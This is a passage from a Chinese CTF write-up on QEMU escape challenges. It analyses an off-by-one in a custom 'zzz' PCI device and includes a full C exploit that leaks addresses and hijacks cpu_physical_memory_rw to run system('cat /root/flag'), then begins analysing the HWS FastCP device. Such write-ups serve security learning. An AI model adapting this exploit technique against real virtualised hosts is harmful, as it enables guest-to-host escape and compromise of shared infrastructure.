<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">pci_zzz_realize</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  *(_BYTE *)(*(_QWORD *)(a1 + <span class="number">144</span>) + <span class="number">61L</span>L) = <span class="number">1</span>;</span><br><span class="line">  memory_region_init_io(a1 + <span class="number">2288</span>, a1, zzz_mmio_ops, a1, <span class="string">"zzz-mmio"</span>, <span class="number">0x100000</span>LL);</span><br><span class="line">  <span class="keyword">return</span> pci_register_bar(a1, <span class="number">0L</span>L, <span class="number">0L</span>L, a1 + <span class="number">2288</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注册了mmio函数</p>
<p><strong>zzz_mmio_read</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">zzz_mmio_read</span><span class="params">(__int64 a1, <span class="keyword">unsigned</span> __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">0xFFF</span> )</span><br><span class="line">    result = *(<span class="keyword">unsigned</span> __int8 *)(a1 + a2 + <span class="number">0x9F0</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个read可以读zzz对象 +0x9F0偏移之后的值</p>
<p><strong>zzz_mmio_write</strong></p>
<p>write基本分为三部分,第一部分就是朴素赋值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">zzz_mmio_write</span><span class="params">(__int64 zzzState, <span class="keyword">unsigned</span> __int64 addr, <span class="keyword">unsigned</span> __int64 val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line">  __int16 v4; <span class="comment">// dx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 v6; <span class="comment">// cx</span></span><br><span class="line">  <span class="keyword">void</span> (__fastcall *v7)(_QWORD, __int64, _QWORD, __int64); <span class="comment">// r10</span></span><br><span class="line">  __int64 v8; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v9; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// esi</span></span><br><span class="line">  __int64 i; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_QWORD *)(zzzState + <span class="number">0x9E0</span>) = val &lt;&lt; <span class="number">12</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr &lt;= <span class="number">0x20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">16</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( val &gt; <span class="number">0xFFF</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *(_WORD *)(zzzState + <span class="number">0x9EA</span>) &gt; <span class="number">0xFFF</span>u )</span><br><span class="line">          *(_WORD *)(zzzState + <span class="number">0x9EA</span>) = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        *(_WORD *)(zzzState + <span class="number">0x9EA</span>) = val;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">24</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_WORD *)(zzzState + <span class="number">0x9E8</span>) = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>第二部分,是对0x9F0开始的buf 进行xor加密，同时这里可以推测出+9EA是start，+9E8是len</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">80</span> )</span><br><span class="line">&#123;</span><br><span class="line">  start = *(<span class="keyword">unsigned</span> __int16 *)(zzzState + <span class="number">0x9EA</span>);</span><br><span class="line">  len = *(_WORD *)(zzzState + <span class="number">0x9E8</span>) &amp; <span class="number">0x7FFE</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)start + len &gt;= <span class="number">0x1000</span> )</span><br><span class="line">    len = <span class="number">0xFFF</span> - start;</span><br><span class="line">  <span class="keyword">for</span> ( i = start + zzzState; len / <span class="number">2</span> &gt; (<span class="keyword">int</span>)start; i += <span class="number">2L</span>L )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_WORD *)(i + <span class="number">0x9F0</span>) ^= <span class="number">0x209</span>u;</span><br><span class="line">    LODWORD(start) = start + <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第三部分</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">96</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v3 = *(_QWORD *)(zzzState + <span class="number">0x19F0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (*(_QWORD *)(v3 + <span class="number">0x9E0</span>) &amp; <span class="number">0xFFF</span>) == <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    len_ = *(_WORD *)(v3 + <span class="number">0x9E8</span>);</span><br><span class="line">    start_ = *(<span class="keyword">unsigned</span> __int16 *)(v3 + <span class="number">0x9EA</span>);</span><br><span class="line">    v6 = len_ &amp; <span class="number">0x7FFE</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">int</span>)(start_ + (len_ &amp; <span class="number">0x7FFE</span>) - <span class="number">1</span>) &lt;= <span class="number">0x1000</span> )<span class="comment">// 这里off_by_one</span></span><br><span class="line">    &#123;</span><br><span class="line">      phy_rw = *(<span class="keyword">void</span> (__fastcall **)(_QWORD, __int64, _QWORD, __int64))(zzzState + <span class="number">0x19F8</span>);<span class="comment">// cpu_physical_memory_rw</span></span><br><span class="line">      v8 = v3 + start_ + <span class="number">0x9F0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (len_ &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">        phy_rw(*(_QWORD *)(v3 + <span class="number">0x9E0</span>), v8, v6, <span class="number">1L</span>L);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        phy_rw(*(_QWORD *)(v3 + <span class="number">0x9E0</span>), v8, v6, <span class="number">0L</span>L);</span><br><span class="line">      <span class="keyword">if</span> ( *(__int16 *)(v3 + <span class="number">0x9E8</span>) &lt; <span class="number">0</span> )</span><br><span class="line">        pci_set_irq(v3, <span class="number">1L</span>L);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个cpu_physical_memory_rw是qemu的API，是对从虚拟机的物理地址中读，或者向虚拟机的物理地址中写，第三部分是存在一个offbyone的，我们指定start为0x1000,len为0x1,可以多写一个字节，从databuf +0x1000刚好是 + 0x19F0，也就是存储zzzState指针的位置</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>第一次我们可以利用offbyone将zzzState ptr最后一个字节改大 ，那么再利用mmio_write的0x60功能号时，几个关键的偏移 phy_addr/data_start/len都会落到data_buf中，我们就可以伪造相关数据，特别是phy_addr</p>
<p>首先将cpu_physical_memory_rw地址读出来就可以得到程序基址，进而得到system_plt</p>
<p>然后读出来zzz_state ptr就可以得到堆地址，进而可以在buf中布置command，同时获得其地址</p>
<p>最后覆盖掉cpu_physical_memory_rw，把command地址填上，就可以getshell</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>下载了原始附件也还是运行不起来，在网上搜是编译的内核的问题，漏洞是看出来了，这里也没法调试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ernel panic - not syncing: VFS: Unable to mount root fs on unknown-block(1,0)</span><br></pre></td></tr></table></figure>
<p>overflow说是内核编译的问题</p>
<p>贴下别人的exp吧</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* mmio_mem;</span><br><span class="line"><span class="keyword">uint64_t</span> phy_userbuf;</span><br><span class="line"><span class="keyword">char</span> *userbuf;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Err</span><span class="params">(<span class="keyword">char</span>* err)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Error: %s\n"</span>, err);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_mmio</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">"/sys/devices/pci0000:00/0000:00:04.0/resource0"</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span>(mmio_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        Err(<span class="string">"Open pci"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(mmio_mem&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        Err(<span class="string">"mmap mmio_mem"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint64_t</span> addr, <span class="keyword">uint64_t</span> value)</span></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint64_t</span>*)(mmio_mem+addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> mmio_read(<span class="keyword">uint64_t</span> addr)&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint64_t</span>*)(mmio_mem+addr)); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_src</span><span class="params">(<span class="keyword">uint64_t</span> addr)</span></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x20</span>, addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_len</span><span class="params">(<span class="keyword">uint64_t</span> num)</span></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x18</span>, num);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_off</span><span class="params">(<span class="keyword">uint64_t</span> offset)</span></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x10</span>, offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_write</span><span class="params">(<span class="keyword">uint64_t</span> offset, <span class="keyword">uint64_t</span> num)</span></span>&#123;</span><br><span class="line">    set_src(phy_userbuf&gt;&gt;<span class="number">12</span>);</span><br><span class="line">    set_len(num);</span><br><span class="line">    set_off(offset);</span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">0x60</span>, <span class="number">0x0</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_enc</span><span class="params">(<span class="keyword">uint64_t</span> offset, <span class="keyword">uint64_t</span> num)</span></span>&#123;</span><br><span class="line">    set_off(offset);</span><br><span class="line">    set_len(num);</span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">0x50</span>, <span class="number">0x0</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> va2pa(<span class="keyword">void</span> *addr)&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/proc/self/pagemap"</span>,O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(!fd)&#123;</span><br><span class="line">        perror(<span class="string">"open pagemap"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> pagesize = getpagesize();</span><br><span class="line">    <span class="keyword">size_t</span> offset = ((<span class="keyword">uintptr_t</span>)addr / pagesize) * <span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(lseek(fd,offset,SEEK_SET) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"lseek"</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(read(fd,&amp;data,<span class="number">8</span>) != <span class="number">8</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"read"</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(data &amp; (((<span class="keyword">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">63</span>))))&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"page"</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> pageframenum = data &amp; ((<span class="number">1u</span>ll &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">size_t</span> phyaddr = pageframenum * pagesize + (<span class="keyword">uintptr_t</span>)addr % pagesize;</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> phyaddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"init mmio:\n"</span>);</span><br><span class="line">    init_mmio();</span><br><span class="line"></span><br><span class="line">    userbuf = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (userbuf == MAP_FAILED)</span><br><span class="line">        Err(<span class="string">"mmap userbuf"</span>);</span><br><span class="line">    mlock(userbuf, <span class="number">0x1000</span>);</span><br><span class="line">    phy_userbuf = va2pa(userbuf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"userbuf va: 0x%llx\n"</span>, userbuf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"userbuf pa: 0x%llx\n"</span>, phy_userbuf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> offset = <span class="number">0x60</span> - <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"offset is: %x\n"</span>, offset);</span><br><span class="line">    <span class="keyword">int</span> phy_addr = phy_userbuf; </span><br><span class="line">    <span class="keyword">char</span> *command=<span class="string">"cat /root/flag\x00"</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(userbuf+<span class="number">0x210</span>, command, <span class="built_in">strlen</span>(command));</span><br><span class="line">    *(<span class="keyword">uint64_t</span>*)(userbuf+<span class="number">0x50</span>) = phy_addr;</span><br><span class="line">    *(<span class="keyword">uint16_t</span>*)(userbuf+<span class="number">0x58</span>)=<span class="number">0xf</span>;</span><br><span class="line">    *(<span class="keyword">uint16_t</span>*)(userbuf+<span class="number">0x5a</span>)=<span class="number">0x1000</span>-offset; </span><br><span class="line"></span><br><span class="line">    set_write(<span class="number">0x00</span>, <span class="number">0x220</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"change base last byte as 0x60\n"</span>);</span><br><span class="line">    *(<span class="keyword">uint8_t</span> *)userbuf = <span class="number">0x00</span>;</span><br><span class="line">    *(<span class="keyword">uint8_t</span> *)(userbuf + <span class="number">1</span>) = <span class="number">0x60</span>;</span><br><span class="line">    set_write(<span class="number">0xfff</span>, <span class="number">0x2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"leak addr:\n"</span>);</span><br><span class="line">    mmio_write(<span class="number">0x60</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">size_t</span> base_addr = *(<span class="keyword">size_t</span> *)userbuf;</span><br><span class="line">    <span class="keyword">size_t</span> phy_rw_addr = *(<span class="keyword">size_t</span> *)(userbuf+<span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"phy_rw_addr: 0x%llx\n"</span>, phy_rw_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"base_addr: 0x%llx\n"</span>, base_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> system_plt = phy_rw_addr - <span class="number">0x5bc5c0</span>+<span class="number">0x2a7a80</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"system_plt: 0x%llx\n"</span>, system_plt);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"enc to change rw flag:\n"</span>);</span><br><span class="line">    set_enc(<span class="number">0x58</span>, <span class="number">0xb8</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> target = (base_addr<span class="number">-0x60</span>+<span class="number">0x9e0</span>+<span class="number">0x220</span>);</span><br><span class="line">    *(<span class="keyword">uint64_t</span>*)(userbuf+<span class="number">0x7</span>) = (target);</span><br><span class="line">    *(<span class="keyword">uint16_t</span>*)(userbuf+<span class="number">0x7</span>+<span class="number">0x8</span>) = (<span class="number">0xf</span>);</span><br><span class="line">    *(<span class="keyword">uint16_t</span>*)(userbuf+<span class="number">0x7</span>+<span class="number">0xa</span>) = (<span class="number">0x0</span>);</span><br><span class="line">    *(<span class="keyword">uint64_t</span>*)(userbuf+<span class="number">0x1f7</span>) = (base_addr<span class="number">-0x60</span>+<span class="number">0xe20</span>);</span><br><span class="line">    *(<span class="keyword">uint64_t</span>*)(userbuf+<span class="number">0x1f7</span>+<span class="number">0x8</span>) = system_plt;</span><br><span class="line">    mmio_write(<span class="number">0x60</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    set_src(target);</span><br><span class="line">    mmio_write(<span class="number">0x60</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2021-HWS-FastCP"><a href="#2021-HWS-FastCP" class="headerlink" title="2021 HWS FastCP"></a>2021 HWS FastCP</h2><p><a href="https://www.anquanke.com/post/id/254906#h2-12" target="_blank" rel="noopener">QEMU逃逸初探（一） - 安全客，安全资讯平台 (anquanke.com)</a></p>
<h3 id="程序分析-2"><a href="#程序分析-2" class="headerlink" title="程序分析"></a>程序分析</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">./qemu-system-x86_64 -initrd ./initramfs-busybox-x64.cpio.gz -nographic -kernel ./vmlinuz-5.0.5-generic -append <span class="string">"priority=low console=ttyS0"</span> -monitor /dev/null --device FastCP</span><br></pre></td></tr></table></figure>
<p>题目文件下载</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://files.buuoj.cn/files/de411f1d372ead78f7263c6ce47b4dc9/FastCP-ctf-.zip</span><br></pre></td></tr></table></figure>
<p>启动脚本里能看到设备名为FastCP</p>
<p>直接输入root即可登录</p>
<p>FastCPState结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> FastCPState     struc ; (<span class="keyword">sizeof</span>=<span class="number">0x1A30</span>, align=<span class="number">0x10</span>, copyof_4530)</span><br><span class="line"><span class="number">00000000</span> pdev            PCIDevice_0 ?</span><br><span class="line"><span class="number">000008F</span>0 mmio            MemoryRegion_0 ?</span><br><span class="line"><span class="number">000009E0</span> cp_state        CP_state ?</span><br><span class="line"><span class="number">000009F</span>8 handling        db ?</span><br><span class="line"><span class="number">000009F</span>9                 db ? ; undefined</span><br><span class="line"><span class="number">000009F</span>A                 db ? ; undefined</span><br><span class="line"><span class="number">000009F</span>B                 db ? ; undefined</span><br><span class="line"><span class="number">000009F</span>C irq_status      dd ?</span><br><span class="line"><span class="number">00000</span>A00 CP_buffer       db <span class="number">4096</span> dup(?)</span><br><span class="line"><span class="number">00001</span>A00 cp_timer        QEMUTimer_0 ?</span><br><span class="line"><span class="number">00001</span>A30 FastCPState     ends</span><br></pre></td></tr></table></figure>
<p><strong>FastCP_class_init</strong></p>
<p>得到Vendor ID为0xBEEFDEAD</p>
<p><strong>pci_FastCP_realize</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">timer_init_full(&amp;v2-&gt;cp_timer, <span class="number">0L</span>L, QEMU_CLOCK_VIRTUAL, (<span class="keyword">int</span>)&amp;stru_F4240, <span class="number">0</span>, fastcp_cp_timer, v2);</span><br><span class="line">memory_region_init_io(</span><br><span class="line">  &amp;v2-&gt;mmio,</span><br><span class="line">  &amp;v2-&gt;pdev.qdev.parent_obj,</span><br><span class="line">  &amp;fastcp_mmio_ops,</span><br><span class="line">  v2,</span><br><span class="line">  <span class="string">"fastcp-mmio"</span>,</span><br><span class="line">  (<span class="keyword">uint64_t</span>)&amp;stru_100000);</span><br><span class="line">pci_register_bar(&amp;pdev-&gt;pdev, <span class="number">0</span>, <span class="number">0</span>, &amp;v2-&gt;mmio);</span><br><span class="line">v2-&gt;irq_status = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>这里新建了一个timer，注册了一个mmio</p>
